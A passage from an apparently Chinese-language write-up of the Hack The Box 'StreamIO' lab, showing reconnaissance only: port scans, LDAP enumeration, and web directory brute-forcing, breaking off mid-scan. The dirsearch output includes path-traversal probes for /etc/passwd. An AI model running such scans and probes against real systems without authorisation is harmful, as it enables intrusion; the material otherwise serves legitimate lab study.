  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">11</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/04/22/box-wp-Scepter/" title="【season-7】 htb Scepter wp" >
            <div class="recent-link-text">
              【season-7】 htb Scepter wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/21/ActionOPs/" title="ActionOPs" >
            <div class="recent-link-text">
              ActionOPs
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/14/Kubernetes-IngressNightmare-1/" title="「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」" >
            <div class="recent-link-text">
              「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/13/box-wp-Nocturnal/" title="【season-7】 htb Nocturnal wp" >
            <div class="recent-link-text">
              【season-7】 htb Nocturnal wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/04/box-wp-Haze/" title="【season-7】 htb Haze wp" >
            <div class="recent-link-text">
              【season-7】 htb Haze wp
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div> 
</sidebar>


    </div>
    
    <div id="toc" class="widget-wrap">
      <button class="toc-toggle" onclick="toggleTOC()">
    <span class="toc-toggle-icon">
        <i class="fa fa-chevron-down" aria-hidden="true"></i>
    </span>
</button>
<div id="tocContainer" style="display: block;">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ldap"><span class="toc-number">2.</span> <span class="toc-text">ldap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#to-User"><span class="toc-number"></span> <span class="toc-text">to User</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#streamIO-htb"><span class="toc-number">1.</span> <span class="toc-text">streamIO.htb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#watch-streamio-htb"><span class="toc-number">2.</span> <span class="toc-text">watch.streamio.htb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#streamio%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">streamio库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#streamio-backup"><span class="toc-number">3.</span> <span class="toc-text">streamio_backup</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#to-Root"><span class="toc-number"></span> <span class="toc-text">to Root</span></a>
</div>
<script>
    function toggleTOC() {
        const tocContainer = document.getElementById('tocContainer');
        const icon = document.querySelector('.toc-toggle-icon i');
        const isHidden = tocContainer.style.display === 'none';
        tocContainer.style.display = isHidden ? 'block' : 'none';
        icon.className = isHidden ? 'fa fa-chevron-up' : 'fa fa-chevron-down';
    }
</script>
<style>
    .toc-toggle {
        position: relative;
        display: inline-block;
        padding: 5px;
        border: 1px solid #ccc;
        border-radius: 50%;
        background-color: #f5f5f5;
        cursor: pointer;
        transition: all 0.2s ease;
    }

    .toc-toggle:hover {
        background-color: #e5e5e5;
    }

    .toc-toggle-icon {
        display: inline-block;
        vertical-align: middle;
    }

    .toc-toggle-icon i {
        font-size: 16px;
        transition: transform 0.2s ease;
    }

    #tocContainer {
        display: block;
        margin-top: 10px;
    }
</style>


    </div>
    
    <div id="content-body">
       


<article id="post-Tracks-AD-StreamIO" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cmatosr1w0016csky9anwck3d">
        <img src="/wpimages/2024/tracks-ad/StreamIO/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        Tracks-AD-StreamIO
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-12-31T10:28:49.000Z" itemprop="datePublished">2024-12-31</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/AD/">AD</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            31k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.158</span><br><span class="line">└─$ sudo nmap -sS 10.10.11.158 -p- --min-rate=2000</span><br><span class="line">[sudo] password <span class="keyword">for</span> fonllge: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 08:23 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.158</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 65516 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">443/tcp   open  https</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49674/tcp open  unknown</span><br><span class="line">49703/tcp open  unknown</span><br><span class="line"></span><br><span class="line">└─$ sudo nmap -sU 10.10.11.158 --top-ports=200 --min-rate=6000</span><br><span class="line">[sudo] password <span class="keyword">for</span> fonllge:</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 08:26 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> streamIO.htb (10.10.11.158)</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">Not shown: 196 open|filtered udp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">53/udp  open  domain</span><br><span class="line">88/udp  open  kerberos-sec</span><br><span class="line">123/udp open  ntp</span><br><span class="line">389/udp open  ldap</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.15 seconds</span><br></pre></td></tr></table></figure>

<p>有web所以再单独跑下web</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sS 10.10.11.158 -p80,443 --min-rate=2000 -sVC</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 08:26 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> streamIO.htb (10.10.11.158)</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">80/tcp  open  http     Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| ssl-cert: Subject: commonName=streamIO/countryName=EU</span><br><span class="line">| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb</span><br><span class="line">| Not valid before: 2022-02-22T07:03:28</span><br><span class="line">|_Not valid after:  2022-03-24T07:03:28</span><br><span class="line">| http-server-header:</span><br><span class="line">|   Microsoft-HTTPAPI/2.0</span><br><span class="line">|_  Microsoft-IIS/10.0</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-12-30T12:27:06+00:00; -1h00m01s from scanner time.</span><br><span class="line">|_http-title: Streamio</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -1h00m01s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 33.39 seconds</span><br></pre></td></tr></table></figure>

<h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldapsearch -x -H ldap://10.10.11.158 -s base</span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;&gt; (default) with scope baseObject</span><br><span class="line"># filter: (objectclass=*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=streamIO,DC=htb</span><br><span class="line">ldapServiceName: streamIO.htb:dc$@STREAMIO.HTB</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">supportedLDAPPolicies: MaxConnections</span><br><span class="line">supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">supportedLDAPPolicies: MaxPageSize</span><br><span class="line">supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">supportedLDAPPolicies: MaxTempTableSize</span><br><span class="line">supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">supportedLDAPPolicies: MinResultSets</span><br><span class="line">supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">supportedLDAPPolicies: MaxValRange</span><br><span class="line">supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.319</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.801</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.473</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.528</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.417</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.619</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.841</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.529</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.805</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.521</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.970</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1338</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.474</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1339</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1340</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1413</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.9</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.10</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1504</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1852</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.802</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1907</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1948</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1974</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1341</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2026</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2064</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2065</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2066</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2090</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2205</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2204</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2206</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2211</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2239</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2255</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2256</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2309</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2330</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2354</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.800</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1670</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1791</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1935</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2080</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2237</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=streamIO,DC=htb</span><br><span class="line">serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat</span><br><span class="line"> ion,DC=streamIO,DC=htb</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=streamIO,DC=htb</span><br><span class="line">namingContexts: DC=streamIO,DC=htb</span><br><span class="line">namingContexts: CN=Configuration,DC=streamIO,DC=htb</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=streamIO,DC=htb</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=streamIO,DC=htb</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=streamIO,DC=htb</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 143468</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN</span><br><span class="line"> =Sites,CN=Configuration,DC=streamIO,DC=htb</span><br><span class="line">dnsHostName: DC.streamIO.htb</span><br><span class="line">defaultNamingContext: DC=streamIO,DC=htb</span><br><span class="line">currentTime: 20241230122321.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=streamIO,DC=htb</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 2</span><br><span class="line"># numEntries: 1</span><br></pre></td></tr></table></figure>

<h1 id="to-User"><a href="#to-User" class="headerlink" title="to User"></a>to User</h1><p>在nmap的记录里可以看到443有DNS如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb</span><br><span class="line"></span><br><span class="line">watch.streamIO.htb</span><br></pre></td></tr></table></figure>

<p>加到hosts里</p>
<h2 id="streamIO-htb"><a href="#streamIO-htb" class="headerlink" title="streamIO.htb"></a>streamIO.htb</h2><p>先访问第一个web</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-1.png" alt="alt text"></p>
<p>about页面有三个用户名，记录一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Johan</span><br><span class="line">Barry</span><br><span class="line">Samantha</span><br></pre></td></tr></table></figure>

<p>然后跑目录可以看到有<code>/admin</code>路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">└─$ dirsearch  -u https://streamio.htb                                                                   </span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/fonllge/Desktop/htb/StreamIO/reports/https_streamio.htb/_24-12-31_05-35-57.txt</span><br><span class="line"></span><br><span class="line">Target: https://streamio.htb/</span><br><span class="line"></span><br><span class="line">[05:35:57] Starting: </span><br><span class="line">[05:36:00] 403 -  312B  - /%2e%2e//google.com                               </span><br><span class="line">[05:36:01] 301 -  147B  - /js  -&gt;  https://streamio.htb/js/                 </span><br><span class="line">[05:36:01] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             </span><br><span class="line">[05:36:13] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           </span><br><span class="line">[05:36:14] 200 -    8KB - /about.php                                        </span><br><span class="line">[05:36:17] 301 -  150B  - /ADMIN  -&gt;  https://streamio.htb/ADMIN/           </span><br><span class="line">[05:36:17] 301 -  150B  - /Admin  -&gt;  https://streamio.htb/Admin/</span><br><span class="line">[05:36:17] 301 -  150B  - /admin  -&gt;  https://streamio.htb/admin/           </span><br><span class="line">[05:36:17] 404 -    2KB - /admin%20/                                        </span><br><span class="line">[05:36:18] 404 -    2KB - /admin.                                           </span><br><span class="line">[05:36:18] 403 -   18B  - /admin/                                           </span><br><span class="line">[05:36:19] 403 -   18B  - /Admin/                                           </span><br><span class="line">[05:36:19] 403 -   18B  - /admin/index.php </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>直接访问会报错</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-2.png" alt="alt text"></p>
<p>再对<code>admin</code>跑一下这个下面的路径，跑出一个<code>master.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">└─$ feroxbuster -u https://streamio.htb/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k -x php</span><br><span class="line">                                                                                                                                                                                                                   </span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben &quot;epi&quot; Risher 🤓                 ver: 2.11.0</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ https://streamio.htb/admin</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.11.0</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ true</span><br><span class="line"> 💲  Extensions            │ [php]</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔓  Insecure              │ true</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">301      GET        2l       10w      150c https://streamio.htb/admin =&gt; https://streamio.htb/admin/</span><br><span class="line">301      GET        2l       10w      157c https://streamio.htb/admin/images =&gt; https://streamio.htb/admin/images/</span><br><span class="line">403      GET        1l        1w       18c https://streamio.htb/admin/index.php</span><br><span class="line">301      GET        2l       10w      154c https://streamio.htb/admin/css =&gt; https://streamio.htb/admin/css/</span><br><span class="line">301      GET        2l       10w      153c https://streamio.htb/admin/js =&gt; https://streamio.htb/admin/js/</span><br><span class="line">200      GET        2l        6w       58c https://streamio.htb/admin/master.php</span><br><span class="line">301      GET        2l       10w      156c https://streamio.htb/admin/fonts =&gt; https://streamio.htb/admin/fonts/</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/admin/%20</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/images/%20</span><br><span class="line">404     